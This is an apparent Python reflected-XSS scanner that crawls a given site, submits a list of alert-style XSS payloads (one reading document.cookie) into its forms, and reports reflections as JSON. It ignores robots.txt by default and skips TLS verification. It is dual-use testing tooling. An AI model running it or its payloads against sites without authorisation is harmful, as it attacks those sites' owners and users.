from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, urlparse
from urllib.robotparser import RobotFileParser
import sys
import json
import warnings
from typing import List, Dict, Set
import argparse
import requests

# Suppress SSL warnings
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

# XSS Payloads
XSS_PAYLOADS = [
    '"><svg/onload=alert(1)>',
    "'><svg/onload=alert(1)>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "'><img src=x onerror=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//--></script>",
    "<Script>alert('XSS')</scripT>",
    "<script>alert(document.cookie)</script>",
]

# Globals
crawled_links = set()
vulnerabilities_found: List[Dict] = []
scanned_urls_internal: Set[str] = set()


# --------------------------------------------------------------------
def get_all_forms(url):
    """Given a `url`, return all forms from the HTML content (silently skip non-200)."""
    try:
        response = requests.get(url, verify=False, timeout=10)
    except requests.RequestException:
        # network error / timeout — skip quietly
        return []

    # If page not OK, don't raise — just return empty (no forms)
    if response.status_code != 200:
        return []

    # Try to let requests detect encoding to avoid replacement characters
    response.encoding = response.apparent_encoding
    soup = bs(response.text, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    """extract form data"""
    details = {}

    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all(["input", "textarea", "select"]):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def submit_form(form_details, url, value):
    """submit form w/ payload"""
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}

    for input_detail in inputs:
        input_name = input_detail.get("name")
        if not input_name:
            continue

        input_type = input_detail.get("type", "text")
        input_value = input_detail.get("value", "")

        if input_type in ["text", "search", "textarea", "email", "url", "password"]:
            data[input_name] = value
        else:
            data[input_name] = input_value

    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data, verify=False, timeout=10)
        else:
            return requests.get(target_url, params=data, verify=False, timeout=10)
    except Exception as e:
        print(f"Error submitting form to {target_url}: {str(e)}", file=sys.stderr)
        return None


def get_all_links(url):
    """Given a `url`, return all links from the HTML content (silently skip non-200)."""
    try:
        response = requests.get(url, verify=False, timeout=10)
    except requests.RequestException:
        return []

    if response.status_code != 200:
        return []

    response.encoding = response.apparent_encoding
    soup = bs(response.text, "html.parser")
    links = []
    for a_tag in soup.find_all("a", href=True):
        href = a_tag.attrs.get("href")
        if href:
            links.append(urljoin(url, href))
    return links


# --------------------------------------------------------------------
def scan_xss(url_to_scan: str, target_domain: str, max_links_limit: int, obey_robots: bool):
    """
    Scans a given URL for XSS vulnerabilities and optionally crawls links.
    Reports results by appending to the global vulnerabilities_found list.
    """
    global crawled_links, vulnerabilities_found, scanned_urls_internal

    normalized_url = urljoin(url_to_scan, urlparse(url_to_scan).path)
    if normalized_url in scanned_urls_internal:
        return

    scanned_urls_internal.add(normalized_url)
    crawled_links.add(normalized_url)

    # robots check
    if obey_robots:
        robot_parser = RobotFileParser()
        robot_parser.set_url(urljoin(target_domain, "/robots.txt"))
        try:
            robot_parser.read()
            if not robot_parser.can_fetch("*", url_to_scan):
                print(f"Skipping {url_to_scan} due to robots.txt", file=sys.stderr)
                return
        except Exception:
            return

    # scan forms
    forms = get_all_forms(url_to_scan)
    for form in forms:
        form_details = get_form_details(form)

        # test each payload; the response handling must be INSIDE this loop
        form_vulnerable = False
        for payload in XSS_PAYLOADS:
            response = submit_form(form_details, url_to_scan, payload)

            if not (response and response.content):
                continue

            try:
                response.encoding = response.apparent_encoding
                response_text = response.text
            except Exception:
                response_text = response.content.decode("utf-8", errors="ignore")

            # check payload reflection
            if payload in response_text:
                vul = {
                    "type": "Cross-Site Scripting (XSS)",
                    "url": url_to_scan,
                    "form_action": form_details.get("action", "N/A"),
                    "form_method": form_details.get("method", "N/A"),
                    "payload": payload,
                }
                if vul not in vulnerabilities_found:
                    vulnerabilities_found.append(vul)
                form_vulnerable = True
                break  # stop testing more payloads for this form

        # optional: if you want to do something when a form is vulnerable, you can use form_vulnerable
        # (but do not reference 'vul' outside the payload loop)

    # crawl internal pages
    current_depth = url_to_scan.count('/') - target_domain.count('/')
    if current_depth < 3:
        links = get_all_links(url_to_scan)
        for link in set(links):
            link_domain = urlparse(link).netloc
            if link_domain == urlparse(target_domain).netloc:
                if max_links_limit > 0 and len(crawled_links) >= max_links_limit:
                    continue
                scan_xss(link, target_domain, max_links_limit, obey_robots)

# --------------------------------------------------------------------
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(json.dumps({"error": "URL argument is missing"}))
        sys.exit(1)

    target_url = sys.argv[1]
    if not urlparse(target_url).scheme:
        target_url = "http://" + target_url

    parsed_target = urlparse(target_url)
    target_domain = f"{parsed_target.scheme}://{parsed_target.netloc}"

    try:
        scan_xss(target_url, target_domain, max_links_limit=0, obey_robots=False)
    except Exception as e:
        print(f"Main scan error: {str(e)}", file=sys.stderr)
    finally:
        out = {
            "target": target_url,
            "urls_scanned": len(crawled_links),
            "vulnerabilities": vulnerabilities_found,
        }
        print(json.dumps(out, indent=2))
